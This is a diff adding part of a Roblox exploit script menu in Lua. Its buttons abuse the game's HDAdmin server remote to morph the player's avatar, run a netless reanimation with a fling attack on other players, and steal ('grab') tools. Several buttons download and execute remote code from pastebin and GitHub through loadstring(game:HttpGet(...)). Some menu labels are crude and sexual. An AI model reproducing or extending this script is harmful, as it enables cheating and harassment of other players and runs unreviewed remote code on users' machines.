+        loadstring(game:HttpGet("https://pastebin.com/raw/mvJvEQr7"))()
+        _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "Fe sex doll",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
+        local Pos = plr.Character.HumanoidRootPart.CFrame
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        plr.Character.Humanoid.WalkSpeed = 0
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
+        wait(0.4)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";char ")
+        wait(0.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4904137145")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4246228452")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4911305457")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4822592866")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 3992084515")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 14815761")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 48474294")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 63690008")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 62234425")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 451220849")
+        plr.Character.HumanoidRootPart.CFrame = Pos
+        plr.Character.Humanoid.WalkSpeed = 20
+        wait(0.7)
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/fff2dwaNNnw243f/d/main/sex%20doll"))()
+        _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "Fe tank",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
+        local Pos = plr.Character.HumanoidRootPart.CFrame
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        plr.Character.Humanoid.WalkSpeed = 0
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4504231783")
+        wait(0.5)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4735116238")
+        plr.Character.HumanoidRootPart.CFrame = Pos
+        plr.Character.Humanoid.WalkSpeed = 20
+        wait(0.5)
+        loadstring(game:HttpGet("https://pastebin.com/raw/2QcSrY1M"))()
+        _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+local selected = nil
+local Dropdown = fescripts:CreateDropdown({
+    Name = "script animation (VERY GOOD)",
+    Options = {"Astronaut","Bubbly","Confident","Cartoony","Cowboy","Elder","Knight","Levitation","Mage","Ninja","Oldschool","Popstar","Pirate","Patrol","Princess","Robot","R15","Stylish","Sneaky","Superhero","Toy","Vampire","Werewolf","Zombie"},
+    CurrentOption = "Select Animation",
+    Callback = function(slc)
+        selected = slc
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "enable animation",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+            game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me DonaldTrump")
+            game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
+            game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";char me 4219276544")
+            wait(1)
+            local PackageName = selected -- change to any of these below, R15 or nil for default
+            
+            local packages = {
+                "Astronaut",
+                "Bubbly",
+                "Confident",
+                "Cartoony",
+                "Cowboy",
+                "Elder",
+                "Knight",
+                "Levitation",
+                "Mage",
+                "Ninja",
+                "Oldschool",
+                "Popstar",
+                "Pirate",
+                "Patrol",
+                "Princess",
+                "Robot",
+                "R15",
+                "Stylish",
+                "Sneaky",
+                "Superhero",
+                "Toy",
+                "Vampire",
+                "Werewolf",
+                "Zombie"
+            }
+            
+            local plr = game.Players.LocalPlayer
+            local char = game.Players.LocalPlayer.Character
+            local ct = {}
+            local te = table.insert
+            local rs = game:GetService("RunService")
+            local stepped = rs.Stepped
+            local heartbeat = rs.Heartbeat
+            
+            local blockhats = {}
+            local smallhats = {}
+            
+            for i,v in pairs(char:GetChildren()) do
+                if v:IsA("Accessory") then 
+                    if v.Handle.Size == Vector3.new(1,1,1) then
+                        table.insert(blockhats,v)
+                    end
+                    if v.Name:find("VarietyShades") then
+                        table.insert(smallhats,v)
+                    end
+                end
+            end
+            
+            if #blockhats < 8 or #smallhats < 2 then
+                return warn("not enough hats", #blockhats, #smallhats)
+            end
+            
+            local netless_Y = Vector3.new(0, 26, 0)
+            local v3_101 = Vector3.new(1, 0, 1)
+            local inf = math.huge
+            local v3_0 = Vector3.new(0,0,0)
+            local function getNetlessVelocity(realPartVelocity) --change this if you have a better method
+                local mag = realPartVelocity.Magnitude
+                if (mag > 1) and (mag < 100) then
+                    local unit = realPartVelocity.Unit
+                    if (unit.Y > 0.25) or (unit.Y < -0.75) then
+                        return realPartVelocity * (25.1 / realPartVelocity.Y)
+                    end
+                    realPartVelocity = unit * 100
+                end
+                return (realPartVelocity * v3_101) + netless_Y
+            end
+            
+            local function align(Part0, Part1, p, r)
+                Part0.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0.0001, 0.0001, 0.0001, 0.0001)
+                Part0.CFrame = Part1.CFrame
+                local att0 = Instance.new("Attachment", Part0)
+                att0.Orientation = r or v3_0
+                att0.Position = v3_0
+                att0.Name = "att0_" .. Part0.Name
+                local att1 = Instance.new("Attachment", Part1)
+                att1.Orientation = v3_0 
+                att1.Position = p or v3_0
+                att1.Name = "att1_" .. Part1.Name
+            
+                local ape = Instance.new("AlignPosition", att0)
+                ape.ApplyAtCenterOfMass = false
+                ape.MaxForce = inf
+                ape.MaxVelocity = inf
+                ape.ReactionForceEnabled = false
+                ape.Responsiveness = 200
+                ape.Attachment1 = att1
+                ape.Attachment0 = att0
+                ape.Name = "AlignPositionRtrue"
+                ape.RigidityEnabled = true
+            
+                local apd = Instance.new("AlignPosition", att0)
+                apd.ApplyAtCenterOfMass = false
+                apd.MaxForce = inf
+                apd.MaxVelocity = inf
+                apd.ReactionForceEnabled = false
+                apd.Responsiveness = 200
+                apd.Attachment1 = att1
+                apd.Attachment0 = att0
+                apd.Name = "AlignPositionRfalse"
+                apd.RigidityEnabled = false
+            
+                local ao = Instance.new("AlignOrientation", att0)
+                ao.MaxAngularVelocity = inf
+                ao.MaxTorque = inf
+                ao.PrimaryAxisOnly = false
+                ao.ReactionTorqueEnabled = false
+                ao.Responsiveness = 200
+                ao.Attachment1 = att1
+                ao.Attachment0 = att0
+                ao.RigidityEnabled = false
+                
+                if type(getNetlessVelocity) == "function" then
+                    local realVelocity = Vector3.new(0,30,0)
+                    local steppedcon = stepped:Connect(function()
+                        Part0.Velocity = realVelocity
+                    end)
+                    local heartbeatcon = heartbeat:Connect(function()
+                        realVelocity = Part0.Velocity
+                        Part0.Velocity = getNetlessVelocity(realVelocity)
+                    end)
+                    Part0.Destroying:Connect(function()
+                        Part0 = nil
+                        steppedcon:Disconnect()
+                        heartbeatcon:Disconnect()
+                    end)
+                    te(ct,steppedcon)
+                    te(ct,heartbeatcon)
+                end
+                
+                att0.Orientation = r or v3_0
+                att0.Position = v3_0
+                att1.Orientation = v3_0 
+                att1.Position = p or v3_0
+                Part0.CFrame = Part1.CFrame
+            end
+            
+            -- for i,v in next, char:GetDescendants() do
+            --     if v:IsA("BasePart") then 
+            --         te(ct,game:GetService("RunService").Heartbeat:connect(function()
+            --             pcall(function()
+            --                 v.Velocity = Vector3.new(24,24,24)
+            --                 plr.ReplicationFocus = workspace
+            --             end)
+            --         end))
+            --     end
+            -- end
+            
+            function notify(t,tex,dur)
+                game.StarterGui:SetCore("SendNotification", {
+                    Title = t; 
+                    Text = tex; 
+                    Duration = dur or 5;
+                })
+            end
+            
+            local fl = Instance.new("Folder",char);fl.Name="ReanimStorage"
+            
+            char.Archivable = true
+            
+            
+            local reanim = game:GetObjects("rbxassetid://7531849760")[1]
+            reanim.Name="Reanim"
+            
+            for i,v in next, reanim:GetDescendants() do
+                if v:IsA("BasePart") or v:IsA("Decal") then
+                    v.Transparency = 1 
+                end 
+                if v:IsA("ParticleEmitter") then
+                    v.Enabled = false
+                end
+            end
+            
+            penis = game.Players.RespawnTime + .5
+            plr.Character = nil
+            plr.Character = char
+            char.Humanoid.AutoRotate = false
+            char.Humanoid.WalkSpeed = 0
+            char.Humanoid.JumpPower = 0
+            char.Torso.Anchored = true
+            notify("Notice", tostring(penis) .. " seconds until reanimation is complete")
+            wait(penis)
+            char.Torso.Anchored = false
+            reanim.Humanoid.HipHeight = 2.1
+            char.Humanoid.HipHeight = 2.1
+            char.Animate.Disabled = true
+            char.Humanoid.Health = 0
+            --reanim.Humanoid.AutoRotate = false
+            
+            reanim.Parent = fl
+            reanim.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame*CFrame.new(0,5,0)
+            
+            packages["Astronaut"] = { 
+                "rbxassetid://891621366",
+                "rbxassetid://891633237",
+                "rbxassetid://891636393",
+                "rbxassetid://891636393",
+                "rbxassetid://891627522",
+                "rbxassetid://891609353",
+                "rbxassetid://891617961",
+                "rbxassetid://891639666",
+                "rbxassetid://891663592"
+            }
+            packages["Bubbly"] = {
+                "rbxassetid://910004836",
+                "rbxassetid://910009958",
+                "rbxassetid://910025107",
+                "rbxassetid://910034870",
+                "rbxassetid://910016857",
+                "rbxassetid://909997997",
+                "rbxassetid://910001910",
+                "rbxassetid://910028158",
+                "rbxassetid://910030921"
+            }
+            packages["Confident"] = {
+                "rbxassetid://1069977950",
+                "rbxassetid://1069987858",
+                "rbxassetid://1070001516",
+                "rbxassetid://1070017263",
+                "rbxassetid://1069984524",
+                "rbxassetid://1069946257",
+                "rbxassetid://1069973677",
+                "rbxassetid://1070009914",
+                "rbxassetid://1070012133"
+            }
+            packages["Cartoony"] = {
+                "rbxassetid://742637544",
+                "rbxassetid://742638445",
+                "rbxassetid://742638842",
+                "rbxassetid://742640026",
+                "rbxassetid://742637942",
+                "rbxassetid://742636889",
+                "rbxassetid://742637151",
+                "rbxassetid://742639220",
+                "rbxassetid://742639812"
+            }
+            packages["Cowboy"] = {
+                "rbxassetid://1014390418",
+                "rbxassetid://1014398616",
+                "rbxassetid://1014401683",
+                "rbxassetid://1014421541",
+                "rbxassetid://1014394726",
+                "rbxassetid://1014380606",
+                "rbxassetid://1014384571",
+                "rbxassetid://1014406523",
+                "rbxassetid://1014411816"
+            }
+            packages["Elder"] = {
+                "rbxassetid://845397899",
+                "rbxassetid://845400520",
+                "rbxassetid://845386501",
+                "rbxassetid://845403856",
+                "rbxassetid://845398858",
+                "rbxassetid://845392038",
+                "rbxassetid://845396048",
+                "rbxassetid://845401742",
+                "rbxassetid://845403127"
+            }
+            packages["Knight"] = {
+                "rbxassetid://657595757",
+                "rbxassetid://657568135",
+                "rbxassetid://657564596",
+                "rbxassetid://657552124",
+                "rbxassetid://658409194",
+                "rbxassetid://658360781",
+                "rbxassetid://657600338",
+                "rbxassetid://657560551",
+                "rbxassetid://657557095"
+            }
+            packages["Levitation"] = {
+                "rbxassetid://616006778",
+                "rbxassetid://616008087",
+                "rbxassetid://616010382",
+                "rbxassetid://616013216",
+                "rbxassetid://616008936",
+                "rbxassetid://616003713",
+                "rbxassetid://616005863",
+                "rbxassetid://616011509",
+                "rbxassetid://616012453"
+            }
+            packages["Mage"] = {
+                "rbxassetid://707742142",
+                "rbxassetid://707855907",
+                "rbxassetid://707861613",
+                "rbxassetid://707897309",
+                "rbxassetid://707853694",
+                "rbxassetid://707826056",
+                "rbxassetid://707829716",
+                "rbxassetid://707876443",
+                "rbxassetid://707894699"
+            }
+            packages["Ninja"] = {
+                "rbxassetid://656117400",
+                "rbxassetid://656118341",
+                "rbxassetid://656118852",
+                "rbxassetid://656121766",
+                "rbxassetid://656117878",
+                "rbxassetid://656114359",
+                "rbxassetid://656115606",
+                "rbxassetid://656119721",
+                "rbxassetid://656121397"
+            }
+            packages["Oldschool"] = {
+                "rbxassetid://5319828216",
+                "rbxassetid://5319831086",
+                "rbxassetid://5319844329",
+                "rbxassetid://5319847204",
+                "rbxassetid://5319841935",
+                "rbxassetid://5319816685",
+                "rbxassetid://5319839762",
+                "rbxassetid://5319850266",
+                "rbxassetid://5319852613"
+            }
+            packages["Popstar"] = {
+                "rbxassetid://1212900985",
+                "rbxassetid://1212954651",
+                "rbxassetid://1212980348",
+                "rbxassetid://1212980338",
+                "rbxassetid://1212954642",
+                "rbxassetid://1213044953",
+                "rbxassetid://1212900995",
+                "rbxassetid://1212852603",
+                "rbxassetid://1212998578"
+            }
+            packages["Pirate"] = {
+                "rbxassetid://750781874",
+                "rbxassetid://750782770",
+                "rbxassetid://750783738",
+                "rbxassetid://750785693",
+                "rbxassetid://750782230",
+                "rbxassetid://750779899",
+                "rbxassetid://750780242",
+                "rbxassetid://750784579",
+                "rbxassetid://750785176"
+            }
+            packages["Patrol"] = {
+                "rbxassetid://1149612882",
+                "rbxassetid://1150842221",
+                "rbxassetid://1150967949",
+                "rbxassetid://1151231493",
+                "rbxassetid://1150944216",
+                "rbxassetid://1148811837",
+                "rbxassetid://1148863382",
+                "rbxassetid://1151204998",
+                "rbxassetid://1151221899"
+            }
+            packages["Princess"] = {
+                "rbxassetid://941003647",
+                "rbxassetid://941013098",
+                "rbxassetid://941015281",
+                "rbxassetid://941028902",
+                "rbxassetid://941008832",
+                "rbxassetid://940996062",
+                "rbxassetid://941000007",
+                "rbxassetid://941018893",
+                "rbxassetid://941025398"
+            }
+            packages["Robot"] = {
+                "rbxassetid://616088211",
+                "rbxassetid://616089559",
+                "rbxassetid://616091570",
+                "rbxassetid://616095330",
+                "rbxassetid://616090535",
+                "rbxassetid://616086039",
+                "rbxassetid://616087089",
+                "rbxassetid://616092998",
+                "rbxassetid://616094091"
+            }
+            packages["R15"] = {
+                "rbxassetid://1132473842",
+                "rbxassetid://4211218409",
+                "rbxassetid://4211220381",
+                "rbxassetid://4211223236",
+                "rbxassetid://4211219390",
+                "rbxassetid://4211214992",
+                "rbxassetid://4211216152",
+                "rbxassetid://4211221314",
+                "rbxassetid://4374694239"
+            }
+            packages["Stylish"] = {
+                "rbxassetid://616136790",
+                "rbxassetid://616138447",
+                "rbxassetid://616140816",
+                "rbxassetid://616146177",
+                "rbxassetid://616139451",
+                "rbxassetid://616133594",
+                "rbxassetid://616134815",
+                "rbxassetid://616143378",
+                "rbxassetid://616144772"
+            }
+            packages["Sneaky"] = {
+                "rbxassetid://1132473842",
+                "rbxassetid://1132477671",
+                "rbxassetid://1132494274",
+                "rbxassetid://1132510133",
+                "rbxassetid://1132489853",
+                "rbxassetid://1132461372",
+                "rbxassetid://1132469004",
+                "rbxassetid://1132500520",
+                "rbxassetid://1132506407"
+            }
+            packages["Superhero"] = {
+                "rbxassetid://616111295",
+                "rbxassetid://616113536",
+                "rbxassetid://616117076",
+                "rbxassetid://616122287",
+                "rbxassetid://616115533",
+                "rbxassetid://616104706",
+                "rbxassetid://616108001",
+                "rbxassetid://616119360",
+                "rbxassetid://616120861"
+            }
+            packages["Toy"] = {
+                "rbxassetid://782841498",
+                "rbxassetid://782845736",
+                "rbxassetid://782842708",
+                "rbxassetid://782843345",
+                "rbxassetid://782847020",
+                "rbxassetid://782843869",
+                "rbxassetid://782846423",
+                "rbxassetid://782844582",
+                "rbxassetid://782845186"
+            }
+            packages["Vampire"] = {
+                "rbxassetid://1083445855",
+                "rbxassetid://1083450166",
+                "rbxassetid://1083462077",
+                "rbxassetid://1083473930",
+                "rbxassetid://1083455352",
+                "rbxassetid://1083439238",
+                "rbxassetid://1083443587",
+                "rbxassetid://1083464683",
+                "rbxassetid://1083467779"
+            }
+            packages["Werewolf"] = {
+                "rbxassetid://1083195517",
+                "rbxassetid://1083214717",
+                "rbxassetid://1083216690",
+                "rbxassetid://1083178339",
+                "rbxassetid://1083218792",
+                "rbxassetid://1083182000",
+                "rbxassetid://1083189019",
+                "rbxassetid://1083222527",
+                "rbxassetid://1083225406"
+            }
+            packages["Zombie"] = {
+                "rbxassetid://616158929",
+                "rbxassetid://616160636",
+                "rbxassetid://616163682",
+                "rbxassetid://616168032",
+                "rbxassetid://616161997",
+                "rbxassetid://616156119",
+                "rbxassetid://616157476",
+                "rbxassetid://616165109",
+                "rbxassetid://616166655"
+            }
+            
+            
+            -- local function align(part, parent, p, r)
+            --     local att1 = Instance.new("Attachment",part)
+            --     local alp = Instance.new("AlignPosition",part)
+            --     local alo = Instance.new("AlignOrientation",part)
+            --     local att2 = Instance.new("Attachment",parent)
+            --     att1.Name = part.Name
+            --     att2.Name = part.Name
+            --     alp.Attachment0 = att1
+            --     alo.Attachment0 = att1
+            --     alp.Attachment1 = att2
+            --     alo.Attachment1 = att2
+            --     att2.Position = p or Vector3.new()
+            --     att1.Orientation = r or Vector3.new()
+            --     alp.MaxForce = 999999999
+            --     alp.MaxVelocity = math.huge
+            --     alp.ReactionForceEnabled = false
+            --     alp.Responsiveness = math.huge
+            --     alo.Responsiveness = math.huge
+            --     alp.RigidityEnabled = false
+            --     alo.MaxTorque = 999999999
+            --     part.Massless = true
+            -- end
+            
+            function pos(part, parent, p)
+                local att1 = Instance.new("Attachment",part)
+                local alp = Instance.new("AlignPosition",part)
+                local att2 = Instance.new("Attachment",parent)
+                att1.Name = part.Name
+                att2.Name = part.Name
+                alp.Attachment0 = att1
+                alp.Attachment1 = att2
+                att2.Position = p or Vector3.new()
+                alp.MaxForce = 999999999
+                alp.MaxVelocity = math.huge
+                alp.ReactionForceEnabled = false
+                alp.Responsiveness = math.huge
+                part.Massless = true
+            end
+            
+            for i,part in next, char:GetDescendants() do
+                if part:IsA("BasePart") then
+                    te(ct,rs.RenderStepped:Connect(function()
+                        part.CanCollide = false
+                    end))
+                end
+            end
+            
+            for i,part in next, char:GetDescendants() do
+                if part:IsA("BasePart") then
+                    te(ct,rs.Stepped:Connect(function()
+                        part.CanCollide = false
+                    end))
+                end
+            end
+            
+            for i,part in next, reanim:GetDescendants() do
+                if part:IsA("BasePart") then
+                    te(ct,rs.RenderStepped:Connect(function()
+                        part.CanCollide = false
+                    end))
+                end
+            end
+            
+            for i,part in next, reanim:GetDescendants() do
+                if part:IsA("BasePart") then
+                    te(ct,rs.Stepped:Connect(function()
+                        part.CanCollide = false
+                    end))
+                end
+            end
+            
+            -- for i,v in next, char:GetDescendants() do
+            --     if v:IsA("Accessory") then
+            --         local c = v:Clone()
+            --         c.Parent = reanim
+            --         align(v.Handle,c.Handle)
+            --     end
+            -- end
+            
+            for i,v in next,blockhats do
+                local m = v.Handle:FindFirstChildOfClass("Mesh") or v.Handle:FindFirstChildOfClass("SpecialMesh")
+                m:Destroy()
+            end
+            
+            for i,v in next,smallhats do
+                local m = v.Handle:FindFirstChildOfClass("Mesh") or v.Handle:FindFirstChildOfClass("SpecialMesh")
+                m:Destroy()
+            end
+            
+            align(char["Head"],reanim["Head"])
+            align(char["Torso"],reanim["UpperTorso"],Vector3.new(0,-.25,0))
+            pos(char["HumanoidRootPart"],reanim["LowerTorso"])
+            align(blockhats[1].Handle,reanim["RightUpperArm"],Vector3.new(0,.1,0))
+            align(blockhats[2].Handle,reanim["LeftUpperArm"],Vector3.new(0,.1,0))
+            align(blockhats[3].Handle,reanim["RightUpperLeg"],Vector3.new(0,-.1,0))
+            align(blockhats[4].Handle,reanim["LeftUpperLeg"],Vector3.new(0,-.1,0))
+            align(blockhats[5].Handle,reanim["RightLowerLeg"],Vector3.new(0,-.2,0))
+            align(blockhats[6].Handle,reanim["LeftLowerLeg"],Vector3.new(0,-.2,0))
+            align(blockhats[7].Handle,reanim["RightLowerArm"],Vector3.new(0,-.3,0))
+            align(blockhats[8].Handle,reanim["LeftLowerArm"],Vector3.new(0,-.3,0))
+            align(smallhats[1].Handle,reanim["RightFoot"],Vector3.new(0,-.1,-.1),Vector3.new(0,90,0))
+            align(smallhats[2].Handle,reanim["LeftFoot"],Vector3.new(0,-.1,-.1),Vector3.new(0,90,0))
+            
+            local Animate = reanim.Animate
+            
+            if PackageName and table.find(packages,PackageName) then
+                local animids = packages[PackageName]
+                Animate.idle.Animation1.AnimationId = animids[1]
+                Animate.idle.Animation2.AnimationId = animids[2]
+                Animate.run.RunAnim.AnimationId = animids[3]
+                Animate.walk.WalkAnim.AnimationId = animids[4]
+                Animate.jump.JumpAnim.AnimationId = animids[5]
+                Animate.climb.ClimbAnim.AnimationId = animids[6]
+                Animate.fall.FallAnim.AnimationId = animids[7]
+                Animate.swim.Swim.AnimationId = animids[8]
+                Animate.swimidle.SwimIdle.AnimationId = animids[9]
+            end
+            
+            local endloop = false
+            spawn(function()
+                wait(1)
+                char.Head.CFrame = CFrame.new(0,500,0)
+                task.wait(.02)
+                while true do
+                    if endloop then break end
+                    char.Head.CFrame = reanim.Head.CFrame
+                    wait(5)
+                    char.Head.CFrame = char.Head.CFrame + Vector3.new(0,300,0)
+                    task.wait(.02)
+                end
+            end)
+            
+            
+            m = plr:GetMouse()
+            
+            --reanim.HumanoidRootPart.RootJoint.Part0 = nil
+            
+            function flinger(p)
+            f = Instance.new("BodyAngularVelocity",p)
+            f.AngularVelocity = Vector3.new(9e9,9e9,9e9)
+            f.MaxTorque = Vector3.new(9e9,9e9,9e9)
+            end
+            
+            flinger(char.HumanoidRootPart)
+            
+            char.HumanoidRootPart.Transparency = 0.6
+            
+            bp = Instance.new("BodyPosition",char.HumanoidRootPart)
+            bp.P = 9e9
+            bp.D = 9e9
+            bp.MaxForce = Vector3.new(99999,99999,99999)
+            
+            local flingtarget
+            
+            te(ct,rs.Heartbeat:Connect(function()
+                if flingtarget then
+                    local pos = {x=0, y=0, z=0}
+                    pos.x = flingtarget.Position.X
+                    pos.y = flingtarget.Position.Y
+                    pos.z = flingtarget.Position.Z
+                    pos.x = pos.x + flingtarget.Velocity.X / 2
+                    pos.y = pos.y + flingtarget.Velocity.Y / 2
+                    pos.z = pos.z + flingtarget.Velocity.Z / 2
+                    bp.Position = Vector3.new(pos.x,pos.y,pos.z)
+                    char.HumanoidRootPart.Position = Vector3.new(pos.x,pos.y,pos.z)
+                else
+                    bp.Position = reanim.LowerTorso.Position
+                    char.HumanoidRootPart.Position = reanim.LowerTorso.Position - Vector3.new(0,15,0)
+                end
+            end))
+            
+            local function flingattack(part)
+                spawn(function()
+                    flingtarget = part
+                    wait(.2)
+                    flingtarget = nil
+                end)
+            end
+            
+            spawn(function()
+                while true do
+                    if ded then break end
+                    for i = 1, 360 do
+                        local col = Color3.fromHSV(i/360, 1, 1)
+                        rs.Stepped:Wait()
+                        char.HumanoidRootPart.Color = col
+                    end
+                end
+            end)
+            
+            te(ct,rs.RenderStepped:Connect(function()
+                reanim.Humanoid:Move(char.Humanoid.MoveDirection, false)
+                reanim.Humanoid.Jump = char.Humanoid.Jump
+            end))
+            
+            spawn(function()
+                script = reanim.Animate
+                loadstring(script.Source)()
+            end)
+            
+            workspace.CurrentCamera.CameraSubject = reanim.Humanoid
+            
+            local reset = Instance.new("BindableEvent")
+            te(ct,reset.Event:Connect(function()
+                reanim:Destroy()
+                HumanDied = true
+                reanimated = false
+                for i,v in next, char:GetDescendants() do
+                    if v:IsA("BasePart") then
+                        v.Anchored = true 
+                    end
+                end
+                
+                plr.Character = nil
+                plr.Character = char
+                
+                for i,v in pairs(ct) do
+                    v:Disconnect()
+                end
+                endloop = true
+                game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
+                reset:Remove()
+                notify("Resetting","Please wait " .. tostring(game.Players.RespawnTime) .. " seconds")
+            end))
+            
+            game:GetService("StarterGui"):SetCore("ResetButtonCallback", reset)
+            _G.dont = false
+            wait(1)
+            loadstring(game:HttpGet("https://pastebin.com/raw/jR00xfMW"))()
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local misc = UI:CreateTab("Misc", 12210555030)
+
+-- [ misc ] --
+
+local Section = misc:CreateSection("misc")
+
+local Toggle = misc:CreateToggle({
+    Name = "antibang / مضاد النيك",
+    CurrentValue = false,
+    Flag = "ab", 
+    Callback = function(value)
+        if value == true then 
+            GUI:Notify({
+                Title = "Note",
+                Content = "AntiBnag is Active!",
+                Duration = 5.2,
+            })
+            antibang()
+        else 
+            GUI:Notify({
+                Title = "Note",
+                Content = "AntiBang Disabled..",
+                Duration = 5.2,
+            })
+            unantibang()
+        end
+    end,
+})
+
+local Button = misc:CreateButton({
+    Name = "antibang v2 / مضاد النيك الاصدار الثاني",
+    Callback = function()
+        antibangV2()
+        GUI:Notify({
+            Title = "Note",
+            Content = "Done.!",
+            Duration = 6.2,
+        })
+    end,
+})
+
+_G.gt = false
+local Toggle = misc:CreateToggle({
+    Name = "grabtools / سرقه الاغراض",
+    CurrentValue = false,
+    Flag = "gt", 
+    Callback = function(value)
+        if value == true then 
+            _G.gt = true
+            GUI:Notify({
+                 Title= "Toggle",
+                Content = "Grabtools is Active",
+                Duration = 5.2,
+            })
+            while _G.gt == true do
+                wait(0.1)
+                grabtools()
+            end
+        else 
+            GUI:Notify({
+                 Title= "Toggle",
+                Content = "Grabtools is Disabled",
+                Duration = 5.2,
+            })
+            _G.gt = false
+            ungrabtools()
+        end
+    end,
+})
+
+local Button1 = misc:CreateButton({
+    Name = "Headless (It's fe btw) / بدون رأس",
+    Callback = function()    
+        Bd()
+        wait(0.5)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Name me bruh im good")
+        print(plr.Character:WaitForChild("bruh im good").Name)
+        print(plr.Character.Head:WaitForChild("face").Name)
+        plr.Character:WaitForChild("bruh im good"):Destroy()
+        plr.Character.Head:WaitForChild("face"):Destroy()
+        for i,v in pairs(plr.Character:GetChildren()) do 
+                if v.Name == "bruh im good" and v.ClassName == "Model" and v.ClassName == "Decal" and v.Name == "face" then
+                    print("---------------------------------------------------------------------")
+                    print(v.Name)
+                    print(v.Parent)
+                    print("---------------------------------------------------------------------")
+                    v:Destroy()
+                end
+            end
+        GUI:Notify({
+            Title = "Note",
+            Content = "Done.!",
+            Duration = 6.2,
+        })
+    end,
+})
+_G.HHHHR = false
+local Toggle = misc:CreateToggle({
+    Name = "auto headless / بدون رأس تلقائي",
+    CurrentValue = false,
+    Flag = "ah", 
+    Callback = function(ah)    
+        Bd()
+        if ah == true then
+            _G.HHHHR = true
+                spawn(function ()
+                    repeat wait()
+                        if plr.CharacterAdded:wait() then
+                            game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Name me bruh im good")
+                            spawn(function ()
+                                while wait() do
+                                    for i,v in pairs(plr.Character:GetChildren()) do
+                                        if v.Name == "bruh im good" and v.ClassName == "Model" then
+                                            print("---------------------------------------------------------------------")
+                                            print(v.Name)
+                                            print(v.Parent)
+                                            print("---------------------------------------------------------------------")
+                                            v:Destroy()
+                                            plr.Character.Head:WaitForChild("face"):Destroy()
+                                            break;
+                                        end
+                                    end
+                                end
+                            end)
+                        end
+                    until _G.HHHHR == false 
+                end)
+                game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Refresh me ")
+            GUI:Notify({
+                Title= "Toggle",
+                Content = "auto headless is Active",
+                Duration = 5.2,
+            })
+        else
+            _G.HHHHR = false
+            GUI:Notify({
+                 Title= "Toggle",
+                Content = "auto headless is Disabled",
+                Duration = 5.2,
+            })
+        end
+    end,
+})
+
+function randomstring()
+	local length = math.random(10,20)
+	local array = {}
+	for i = 1, length do
+		array[i] = string.char(math.random(32, 126))
+	end
+	return table.concat(array)
+end
+_G.ANTIAFK = false
+local Button2 = misc:CreateButton({
+    Name = "Anti Afk / عدم الطرد",
+    Callback = function()
+        if _G.ANTIAFK == false then
